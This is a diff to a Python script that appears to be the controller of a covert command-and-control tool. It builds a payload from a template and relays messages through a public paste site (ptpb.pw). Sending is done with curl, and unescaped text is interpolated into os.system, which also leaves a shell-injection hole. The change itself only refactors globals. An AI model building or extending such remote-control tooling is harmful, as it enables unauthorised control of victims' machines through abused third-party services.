@@ -2,13 +2,17 @@
 
 import requests, uuid
 
+class Vars(object):
+	pass
+vars = Vars()
+
 def send(text):
 	os.system("echo \"%s\" | curl -F c=@- %s" % (text,url))
 def recv():
 	return requests.get(url).content
 
 def build_payload():
-	return url + open("./template.py","r").read()
+	return vars.url + open("./template.py","r").read()
 
 def server_loop():
 	old = recv()
@@ -36,9 +40,9 @@ def handle(msg):
 		print("Unrecognized message:\n" + msg + "\n\n")
 
 def main():
-	id = input("Enter secret name or leave blank to auto-generate: ")
-	if id == "": id = ''.join(str(uuid.uuid4()).split("-"))
-	url = "https://ptpb.pw/~" + id
+	vars.id = input("Enter secret name or leave blank to auto-generate: ")
+	if vars.id == "": vars.id = ''.join(str(uuid.uuid4()).split("-"))
+	vars.url = "https://ptpb.pw/~" + vars.id
 	build = input("Build payload? Y/n: ").lower()
 	if not build == "n":
 		filename = input("Enter filename to save as: ")
